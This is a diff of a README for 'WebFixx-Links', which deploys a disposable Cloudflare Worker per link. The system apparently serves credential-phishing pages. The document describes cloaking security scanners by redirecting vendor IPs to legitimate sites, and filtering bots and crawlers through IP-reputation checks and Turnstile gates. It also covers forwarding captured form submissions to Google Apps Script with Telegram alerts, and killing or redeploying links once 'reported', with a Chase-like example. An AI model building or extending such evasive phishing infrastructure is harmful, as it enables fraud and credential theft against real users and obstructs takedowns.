@@ -1,6 +1,6 @@
 # WebFixx-Links
 
-Edge link engine for WebFixx-Hoo. One Cloudflare Worker per link, deployed on demand by the WebFixx-Hoo Apps Script helper `createCloudflareLink`. Each Worker serves template pages (`/`, `/page…`) ungated and redirect pages (`/document…`, `/directory…`, `/directories…`, `/archive…`) with strong bot protection and a **verified Turnstile gate on every flow** (gate active when `TURNSTILE_SECRET` row 18 is set).
+Edge link engine for WebFixx-Hoo. One Cloudflare Worker per link, deployed on demand by the WebFixx-Hoo Apps Script helper `createCloudflareLink`. Each Worker serves template pages (`/`, `/page…`) ungated and redirect pages (`/document…`, `/directory…`, `/directories…`, `/archive…`) with strong bot protection and a **verified Turnstile gate on every flow** (gate active when `TURNSTILE_SECRET` row 18 is set; the `/api/*` form endpoints are always ungated), and proxies the `/api` form endpoints templates POST to their own origin.
 
 - Content and live link status always come from Apps Script per click (`verifyPageVisit` / `verifyRedirectVisit`) — the freshest `templateCode`/`redirectURL` and the visit counters/Telegram notifications stay in the sheet's pipeline.
 - Zero origin: clicks never touch the WebFixx-Hoo Flask host. Killing a link = deleting its Worker (`killCloudflareLink`) — sibling links are unaffected.
@@ -8,11 +8,12 @@ Edge link engine for WebFixx-Hoo. One Cloudflare Worker per link, deployed on de
 
 ## Worker behavior (per click)
 
-1. Route classification (parity with Flask `api/index.py`): `/archive…` → captcha flow · `/document|directory|directories…` → premium flow · everything else → template flow. Premium paths get a best-effort 10/min per-IP rate limit (parity with Flask-Limiter).
+1. Route classification (parity with Flask `api/index.py`): `/archive…` → captcha flow · `/document|directory|directories…` → premium flow · `/api/…` → API flow (see step 5) · everything else → template flow. Premium paths get a best-effort 10/min per-IP rate limit (parity with Flask-Limiter).
    **Per-Worker link kind (`CONFIG.kind`, baked at deploy)**: a Worker created for a redirect link (`kind: "redirect"`) owns its bare paths — `/<path>` (and `/page…`) route to the **premium/redirect flow**, never the project flow, so `https://host/<urlPath>` serves the redirect. Project Workers (`kind: "template"`) keep the routing above exactly (bare paths → `verifyPageVisit`).
 2. Full gating on the **premium/redirect flow only** (parity with the Flask redirect handler, same order): ipinfo.org org-keywords → 302 to a legitimate domain (fail-open) · empty/bot/crawler User-Agent → error page · IPHUB `block==1` / AbuseIPDB confidence `>50` → error page (per-isolate cache, fail-open on API errors). The template flow has **no bot gating** (straight to `verifyPageVisit`; the decoy-redirect protection is the redirect handler's job). Archive flow has no UA/IP checks (origin parity).
 3. **Turnstile gate (maximum protection, all flows, requires row 18)**: visitors without a valid gate cookie get a managed Turnstile challenge. The token is really verified server-side (Cloudflare `siteverify` with the visitor's `CF-Connecting-IP`). On success the Worker sets an IP-bound HMAC cookie (`wf_gate`, 45 min) and continues; within the TTL repeat visits skip the challenge. With a blank `TURNSTILE_SECRET` this step is skipped entirely (gate off).
 4. Apps Script verify (retry ×2, exact origin error strings): template → `templateCode` (+ `userId` injection into `verify-login` URLs) as HTML · premium → `redirect.html` shell (random SEO metadata, `t` token, query params preserved) · archive → `captcha.html` shell (3s loader → destination).
+5. **`/api/*` form endpoints (Flask `api/index.py:61-98` parity)**: templates POST same-origin `POST /api/notify-form-submission`, `/api/pooling-operator`, `/api/update-process`; the Worker forwards each as `{action, key, …form}` (urlencoded) to the baked GAS `/exec` and returns its JSON. `notify-form-submission` → `action: notifyFormSubmission`, retried until `apiResponse.browserId` appears, else the Flask fallback `{success:true, apiResponse:{}}` (120s timeout). `pooling-operator` **and** `update-process` → `action: poolingOperator` (the update-process→poolingOperator mapping is Flask's), 500 `{error}` on transient GAS. `/api/*` bypasses the Turnstile gate, the kind override and the premium rate limit (Flask serves these ungated); per-IP limits 10/min notify, 100/min pooling; JSON responses carry `Access-Control-Allow-Origin: *`. POST-only (GET → 405).
 
 ## Settings (WebFixx-Hoo spreadsheet, `settings` sheet)
 
@@ -22,7 +23,7 @@ Read by `createCloudflareLink` from `settingsKey` / `settingsValue1`:
 | --- | --- | --- |
 | 12 | `CLOUDFLARE_API_TOKEN` | Cloudflare API token with **Account → Workers Scripts → Edit** + **Account → Account Settings → Read** |
 | 13 | `CLOUDFLARE_ACCOUNT_ID` | Cloudflare account id |
-| 14 | `LINKS_REPO` | `web-fixx1/WebFixx-Links` (owner/repo) |
+| 14 | `LINKS_REPO` | `web-fixx1/WebFixx-Links` (owner/repo) — the fork must be synced to this repo's `main` before any create/redeploy, or stale `worker.js` ships (no `CONFIG.kind`, no `/api` routes) |
 | 15 | `GITHUB_TOKEN` | Fine-grained PAT with **Contents: Read-only** on this repo |
 | 16 | `IPHUB_API_KEY` | **optional** — same key as WebFixx-Hoo `.env` |
 | 17 | `ABUSEIPDB_API_KEY` | **optional** — same key as WebFixx-Hoo `.env` |
@@ -36,7 +37,7 @@ The Apps Script must also be deployed as a web app (Deploy → New deployment �
 ## Deploy / kill flow
 
 - **Create**: hook in WebFixx-Hoo calls `createCloudflareLink(nameHint, entityId, kind)` (`kind` = `template` | `redirect`) → fetches this repo's latest `worker.js` (GitHub contents API) → injects secrets + kind → uploads to Cloudflare as `wf-<slug>-<6 chars>` → returns `https://wf-….workers.dev` → written into the links sheet **with a trailing slash** (`https://wf-….workers.dev/`) so every base+path concat in the dashboard comes out as a valid URL.
-- **Update protection/code**: push to this repo. Every **new** link runs the latest code; existing links keep the code they were deployed with.
+- **Update protection/code**: push to this repo. Every **new** link runs the latest code. Existing workers keep the code they were deployed with — upgrade them in place with `redeployCloudflareWorker(linkUrl, kind)` (WebFixx-Hoo): it re-PUTs current source to the **same worker name** taken from the URL, so the URL (and every sheet row pointing at it) never changes. `testRedeployKnownWorkers` covers the live test workers.
 - **Kill a reported link**: `killCloudflareLink('https://wf-chase-x7k2m9.workers.dev')` → deletes that one Worker (404 on Cloudflare = already dead, treated as success).
 
 ## Local test (optional)
